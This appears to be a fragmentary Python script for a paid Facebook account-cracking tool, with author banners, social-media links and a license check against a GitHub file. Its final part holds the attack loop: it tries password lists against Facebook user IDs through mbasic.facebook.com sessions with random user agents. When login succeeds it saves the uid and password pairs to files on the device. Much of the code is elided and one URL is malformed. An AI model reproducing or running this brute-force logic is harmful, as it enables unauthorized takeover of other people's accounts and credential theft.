#RAKIB(SAT RAKIB YT)(RAKIB.KHAN)
#WhatsApp : 01618921827
#Github : RAKIB-CYBER-145
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By RAKIB")
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/RAKIB-CYBER-145/New-Project-2023-/blob/main/Approvle.txt').text
...
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝
    ...
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : DX RAKIB-KHAN💚            │
    │ [✓] GITHUB   : RAKIB-CYBER-145                │
    │ [✓] WHATSAPP : +881603238653        │
    │ [✓] VERSION  : 8.7                   │
    │ [✓] TOOLS    : \033[1;32m PAID\033[1;37m│
    └───────────────────────────────────────┘""")
  print(f"\t \033[1;32m NAMTA MONE RAKHBEN VIRUS TEAM-RAKIB & RAKIB CYBER ™ \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  RAKIB SIR TOOLS ER PRICE CHILO 6K TK  \033[1;37m ")
  print(f"")
  ...
  os.system(f'xdg-open https://www.facebook.com/RAKIB.CYBER.143.MYMENSINGH.ER.KING')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://https://github.com/RAKIB-CYBER-145/New-Project-2023-/blob/main/Approvle.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+8801603238653?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝
    ...
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : DX RAKIB BOSS            │
    │ [✓] GITHUB   : RAKIB-CYBER-12                │
    │ [✓] WHATSAPP : +8801603238653         │
    │ [✓] VERSION  : 8.7                 │
    │ [✓] TOOLS    : \033[1;32m PAID\033[1;37m│
    └───────────────────────────────────────┘""")
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/RAKIB.CYBER.143.MYMENSINGH.ER.KING');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://www.youtube.com/@Mohammad.RAKIB.143');time.sleep(1)
		admin()
	if bal =='0':
		Main()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/RAKIB1×1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRAKIB1×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
